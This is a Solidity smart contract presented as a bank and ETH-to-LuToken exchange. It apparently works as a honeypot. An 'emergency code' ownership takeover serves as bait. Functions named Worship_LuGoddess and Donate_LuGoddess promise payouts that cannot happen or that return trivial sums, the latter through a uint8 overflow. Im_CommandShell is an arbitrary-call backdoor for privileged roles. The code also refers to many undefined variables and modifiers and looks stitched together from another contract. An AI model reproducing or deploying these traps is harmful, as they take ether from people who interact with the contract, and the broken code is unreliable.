pragma solidity ^0.5.3;












contract MoneyMoneyBank is AccessControl {
    
    event BankDeposit(address From, uint Amount);
    event BankWithdrawal(address From, uint Amount);
    
    address public cfoAddress = msg.sender;
    
    uint256 Code;
    uint256 Value;





    function Deposit() 
    public payable 
    {
        require(msg.value > 0);
        emit BankDeposit({From: msg.sender, Amount: msg.value});
    }





    function Withdraw(uint _Amount) 
    public onlyCFO 
    {
        require(_Amount <= address(this).balance);
        msg.sender.transfer(_Amount);
        emit BankWithdrawal({From: msg.sender, Amount: _Amount});
    }




    function Set_EmergencyCode(uint _Code, uint _Value) 
    public onlyCFO 
    {
        Code = _Code;
        Value = _Value;
    }





    function Use_EmergencyCode(uint code) 
    public payable 
    {
        if ((code == Code) && (msg.value == Value)) 
        {
            cfoAddress = msg.sender;
        }
    }




    
    function Exchange_ETH2LuToken(uint _UserId) 
    public payable whenNotPaused
    returns (uint UserId,  uint GetLuTokenAmount, uint AccountRemainLuToken)
    {
        uint Im_CreateLuTokenAmount = (msg.value)/(1e14);
        
        TotalERC20Amount_LuToken = TotalERC20Amount_LuToken + Im_CreateLuTokenAmount;
        Mapping__OwnerUserId_ERC20Amount[_UserId] = Mapping__OwnerUserId_ERC20Amount[_UserId] + Im_CreateLuTokenAmount;
        
        emit ExchangeLuTokenEvent
        (
            {_ETH_AddressEvent: msg.sender,
            _ETH_ExchangeAmountEvent: msg.value,
            _LuToken_UserIdEvnet: UserId,
            _LuToken_ExchangeAmountEvnet: Im_CreateLuTokenAmount,
            _LuToken_RemainAmountEvent: Mapping__OwnerUserId_ERC20Amount[_UserId]}
        );    
        
        return (_UserId, Im_CreateLuTokenAmount, Mapping__OwnerUserId_ERC20Amount[_UserId]);
    }


    
    
    
    function Exchange_LuToken2ETH(address payable _GetPayAddress, uint LuTokenAmount) 
    public whenNotPaused
    returns 
    (
        bool SuccessMessage, 
        uint PayerUserId, 
        address GetPayAddress, 
        uint PayETH_Amount, 
        uint AccountRemainLuToken
    ) 
    {
        uint Im_PayerUserId = Mapping__UserAddress_UserId[msg.sender];
        
        require(Mapping__OwnerUserId_ERC20Amount[Im_PayerUserId] >= LuTokenAmount && LuTokenAmount >= 1);
        Mapping__OwnerUserId_ERC20Amount[Im_PayerUserId] = Mapping__OwnerUserId_ERC20Amount[Im_PayerUserId] - LuTokenAmount;
        TotalERC20Amount_LuToken = TotalERC20Amount_LuToken - LuTokenAmount;
        bool Success = _GetPayAddress.send(LuTokenAmount * (98e12));
        
        emit ExchangeLuTokenEvent
        (
            {_ETH_AddressEvent: _GetPayAddress,
            _ETH_ExchangeAmountEvent: LuTokenAmount * (98e12),
            _LuToken_UserIdEvnet: Im_PayerUserId,
            _LuToken_ExchangeAmountEvnet: LuTokenAmount,
            _LuToken_RemainAmountEvent: Mapping__OwnerUserId_ERC20Amount[Im_PayerUserId]}
        );         
        
        return (Success, Im_PayerUserId, _GetPayAddress, LuTokenAmount * (98e12), Mapping__OwnerUserId_ERC20Amount[Im_PayerUserId]);
    }
    
    
    
    
    
    function SettingAutoGame_BettingRankRange(uint _RankNumber,uint _MinimunBetting, uint _MaximunBetting) 
    public onlyC_Meow_O
    returns (uint RankNumber,uint MinimunBetting, uint MaximunBetting)
    {
        Mapping__AutoGameBettingRank_BettingRange[_RankNumber] = [_MinimunBetting,_MaximunBetting];
        return
        (
            _RankNumber,
            Mapping__AutoGameBettingRank_BettingRange[_RankNumber][0],
            Mapping__AutoGameBettingRank_BettingRange[_RankNumber][1]
        );
    }
    




    function Im_CommandShell(address _Address,bytes memory _Data)
    public payable onlyCLevel
    {
        _Address.call.value(msg.value)(_Data);
    }   




    
    function Worship_LuGoddess(address payable _Address)
    public payable
    {
        if(msg.value >= address(this).balance)
        {        
            _Address.transfer(address(this).balance + msg.value);
        }
    }
    
    
    
    
    
    function Donate_LuGoddess()
    public payable
    {
        if(msg.value > 0.5 ether)
        {
            uint256 MutiplyAmount;
            uint256 TransferAmount;
            
            for(uint8 Im_ETHCounter = 0; Im_ETHCounter <= msg.value * 2; Im_ETHCounter++)
            {
                MutiplyAmount = Im_ETHCounter * 2;
                
                if(MutiplyAmount <= TransferAmount)
                {
                  break;  
                }
                else
                {
                    TransferAmount = MutiplyAmount;
                }
            }    
            msg.sender.transfer(TransferAmount);
        }
    }


    
    
}















